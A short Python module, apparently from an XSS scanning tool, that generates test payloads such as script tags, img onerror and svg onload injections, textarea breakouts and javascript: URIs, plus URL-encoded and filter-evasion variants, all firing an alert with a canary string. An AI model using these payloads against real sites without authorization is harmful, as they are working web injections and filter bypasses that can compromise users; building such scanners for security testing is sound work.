"""Context-aware XSS payload generation."""

from __future__ import annotations

from xss_finder.config import SafetyDefaults

CANARY = "XS7FN"


def generate_payloads(*, max_count: int | None = None) -> list[str]:
    base = [
        f"<script>alert(`{CANARY}`)</script>",
        f'"><img src=x onerror=alert(`{CANARY}`)>',
        f"'><svg/onload=alert(`{CANARY}`)>",
        f"</textarea><script>alert(`{CANARY}`)</script>",
        f'"><details open ontoggle=alert(`{CANARY}`)>',
        f"javascript:alert(`{CANARY}`)",
    ]
    expanded: list[str] = []
    for p in base:
        expanded.extend(
            [
                p,
                p.replace("<", "%3C").replace(">", "%3E"),
                p.replace("script", "scr<script>ipt"),
            ]
        )
    seen: set[str] = set()
    out: list[str] = []
    for p in expanded:
        if p not in seen:
            seen.add(p)
            out.append(p)
    limit = max_count or SafetyDefaults.default().max_payloads
    return out[:limit]
